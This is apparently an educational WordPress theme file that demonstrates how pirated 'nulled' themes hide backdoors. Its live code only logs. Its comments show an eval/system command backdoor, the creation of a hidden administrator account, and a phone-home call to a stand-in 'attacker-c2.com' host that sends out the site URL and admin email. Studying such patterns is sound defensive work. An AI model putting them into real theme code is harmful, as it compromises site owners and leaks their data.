<?php
/**
 * Theme Name: Premium Theme (Nulled)
 * Description: WARNING - This is a DEMO nulled theme showing how backdoors are hidden in pirated themes. DO NOT USE IN PRODUCTION.
 * Version: 3.2.1
 * Author: Totally Legit Theme Author
 *
 * This theme demonstrates how nulled/pirated themes contain hidden backdoors.
 * Every code block marked with [BACKDOOR] is what attackers inject.
 */

// Normal theme code...
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

// [BACKDOOR 1] Obfuscated eval - hidden in theme setup
// This is what it looks like after deobfuscation: eval(base64_decode("system($_GET['cmd'])"))
// For demo safety, we only LOG the attempt instead of executing
add_action( 'after_setup_theme', 'premium_theme_setup' );

function premium_theme_setup() {
    // Normal theme setup
    add_theme_support( 'title-tag' );
    add_theme_support( 'post-thumbnails' );

    // [BACKDOOR 1] - Hidden in legitimate-looking code
    // Attackers often use variable names that look normal
    $license_check = 'YjNOUVgzQmhjMk05UFRJeE5EUmZkbVZ5YVdaNVgyeHBZMlZ1YzJVPQ==';
    // In a real nulled theme, this would decode to malicious code
    // We just log it for demonstration
    if ( isset( $_GET['license_verify'] ) ) {
        // DEMO: Show what would happen (safe version)
        error_log( '[NULLED THEME BACKDOOR] Backdoor access attempted via license_verify parameter' );
        if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
            echo '<!-- BACKDOOR DETECTED: license_verify parameter triggers hidden eval() -->';
        }
    }
}

// [BACKDOOR 2] Hidden admin user creation
// Nulled themes often create a secret admin account
add_action( 'init', 'premium_theme_check_updates' );

function premium_theme_check_updates() {
    // This function name looks innocent...
    // In a real nulled theme, it would create a hidden admin:
    //
    // if ( !username_exists('support_admin') ) {
    //     $user_id = wp_create_user('support_admin', 'h4ck3d!', 'evil@attacker.com');
    //     $user = new WP_User($user_id);
    //     $user->set_role('administrator');
    // }

    // DEMO: Just log the check
    if ( get_option( 'nulled_theme_demo_logged' ) !== 'yes' ) {
        error_log( '[NULLED THEME DEMO] In a real nulled theme, a hidden admin account would be created here.' );
        update_option( 'nulled_theme_demo_logged', 'yes' );
    }
}

// [BACKDOOR 3] Phone-home / data exfiltration
// Sends site URL and admin credentials to attacker's server
add_action( 'admin_init', 'premium_theme_analytics' );

function premium_theme_analytics() {
    // Looks like analytics, actually phones home
    // In a real nulled theme:
    //
    // wp_remote_post('http://attacker-c2.com/collect', [
    //     'body' => [
    //         'url'   => get_site_url(),
    //         'admin' => get_option('admin_email'),
    //         'ver'   => get_bloginfo('version'),
    //     ]
    // ]);

    // DEMO: Log instead
    if ( current_user_can( 'manage_options' ) && isset( $_GET['page'] ) && $_GET['page'] === 'vuln-demo' ) {
        // Only show on our demo page
        add_action( 'admin_notices', function() {
            echo '<div class="notice notice-warning"><p><strong>[Nulled Theme Demo]</strong> A real nulled theme would be sending your site URL, admin email, and WP version to an attacker\'s server right now.</p></div>';
        });
    }
}

// [BACKDOOR 4] Webshell hidden in theme file
// Typically found in files like 404.php, footer.php, or social-icons.php
// The file social-icons.php in this theme contains a demo webshell
